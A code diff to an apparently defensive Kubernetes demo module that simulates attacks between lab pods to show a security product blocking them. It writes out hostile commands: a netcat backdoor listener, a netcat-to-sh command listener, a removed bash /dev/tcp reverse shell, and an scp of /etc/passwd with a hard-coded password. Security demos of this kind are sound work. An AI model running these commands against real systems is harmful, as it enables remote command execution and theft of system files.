@@ -1,5 +1,6 @@
 """Attack simulation demo - simulate various attack scenarios."""
 
+import asyncio
 from typing import Any, AsyncGenerator
 
 from app.core.kubectl import Kubectl
@@ -66,15 +67,14 @@ class AttackSimulationDemo(DemoModule):
         if target == "cible1":
             # Get the pod IP for cible1
             try:
-                ip_output = []
-                async for line in kubectl.run_command([
+                stdout, stderr, returncode = await kubectl.run(
                     "get", "pod", "cible1",
-                    "-n", NAMESPACE,
-                    "-o", "jsonpath={.status.podIP}"
-                ]):
-                    ip_output.append(line)
-                pod_ip = "".join(ip_output).strip()
-                if pod_ip and not pod_ip.startswith("["):
+                    "-o", "jsonpath={.status.podIP}",
+                    namespace=NAMESPACE,
+                    check=False,
+                )
+                pod_ip = stdout.strip()
+                if pod_ip and returncode == 0:
                     return pod_ip
             except Exception:
                 pass
@@ -119,18 +119,43 @@ class AttackSimulationDemo(DemoModule):
             yield "[INFO] Simulating DoS attack with oversized ICMP packets (40KB payload)"
         elif attack_type == "nc_backdoor":
             # Netcat backdoor listener - will be blocked in Protect mode
-            cmd_args = ["nc", "-l", "4444"]
-            yield "[INFO] Attempting to start netcat backdoor listener on port 4444"
+            cmd_args = ["nc", "-l", "-w", "5", "4444"]
+            yield "[INFO] Attempting to start netcat backdoor listener on port 4444 (5s timeout)"
         elif attack_type == "scp_transfer":
-            # File transfer of sensitive data
-            cmd_args = ["scp", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
+            # File transfer of sensitive data using sshpass for non-interactive auth
+            cmd_args = ["sshpass", "-p", "demo123", "scp",
+                       "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
                        "/etc/passwd", f"root@{target_addr}:/tmp/"]
             yield "[INFO] Attempting to transfer sensitive file (/etc/passwd)"
         elif attack_type == "reverse_shell":
-            # Reverse shell attempt - will be blocked
-            # We use bash -c to attempt the connection
-            cmd_args = ["bash", "-c", f"bash -i >& /dev/tcp/{target_addr}/4444 0>&1"]
-            yield "[INFO] Attempting reverse shell connection"
+            # Reverse shell: start listener on target, connect from source
+            # When connection succeeds, execute hostname -f on target
+            yield "[INFO] Step 1: Starting command listener on cible1:4444..."
+
+            # Start listener on cible1 that will execute received commands
+            # It listens, receives a command, executes it, and stores output
+            listener_cmd = ["sh", "-c", "rm -f /tmp/shell_output; (nc -l -p 4444 -w 10 | sh > /tmp/shell_output 2>&1) & echo $!"]
+            try:
+                stdout, stderr, rc = await kubectl.run(
+                    "exec", "cible1", "--", *listener_cmd,
+                    namespace=NAMESPACE,
+                    check=False,
+                )
+                if rc == 0:
+                    yield f"[INFO] Listener started on cible1 (PID: {stdout.strip()})"
+                else:
+                    yield f"[WARNING] Failed to start listener: {stderr}"
+            except Exception as e:
+                yield f"[WARNING] Failed to start listener: {e}"
+
+            # Small delay to ensure listener is ready
+            await asyncio.sleep(1)
+
+            yield "[INFO] Step 2: Sending remote command from espion1..."
+            # Send hostname -f command to the listener
+            # Note: nc may return exit code 1 after connection closes (normal)
+            cmd_args = ["sh", "-c", f"echo 'hostname -f' | nc -w 3 {target_addr} 4444 || true"]
+            yield "[INFO] Sending 'hostname -f' command to cible1 via netcat"
         else:
             yield f"[ERROR] Unknown attack type: {attack_type}"
             return
@@ -153,7 +178,8 @@ class AttackSimulationDemo(DemoModule):
                 yield line
                 # Check for various blocking/error indicators
                 lower_line = line.lower()
-                if 'exit code 137' in lower_line or 'command terminated' in lower_line:
+                # Only exit code 137 (SIGKILL) indicates NeuVector block
+                if 'exit code 137' in lower_line:
                     process_killed = True
                 if 'permission denied' in lower_line or 'operation not permitted' in lower_line:
                     permission_denied = True
@@ -169,13 +195,38 @@ class AttackSimulationDemo(DemoModule):
                 elif attack_type == "scp_transfer":
                     if '100%' in line:
                         command_success = True
+                elif attack_type == "reverse_shell":
+                    # nc exits cleanly if connection was made
+                    pass  # Check will be done after command
         except Exception as e:
             error_str = str(e).lower()
-            if 'exit code 137' in error_str or 'command terminated' in error_str:
+            # Exit code 137 = SIGKILL (NeuVector Protect mode)
+            if 'exit code 137' in error_str:
                 process_killed = True
+            # Exit code 126/127 = permission denied or command not found
             elif 'exit code 126' in error_str or 'exit code 127' in error_str:
                 permission_denied = True
             yield f"[ERROR] {str(e)}"
+
+        yield ""
+
+        # For reverse shell, check if command was executed on target
+        if attack_type == "reverse_shell" and not process_killed and not permission_denied:
+            await asyncio.sleep(2)  # Wait for command execution
+            yield "[INFO] Step 3: Checking result on cible1..."
+            try:
+                stdout, stderr, rc = await kubectl.run(
+                    "exec", "cible1", "--", "cat", "/tmp/shell_output",
+                    namespace=NAMESPACE,
+                    check=False,
+                )
+                if rc == 0 and stdout.strip():
+                    yield f"[SUCCESS] Remote command executed! Hostname: {stdout.strip()}"
+                    command_success = True
+                else:
+                    yield "[INFO] No output received (connection may have failed)"
+            except Exception as e:
+                yield f"[INFO] Could not verify result: {e}"
 
         yield ""
 
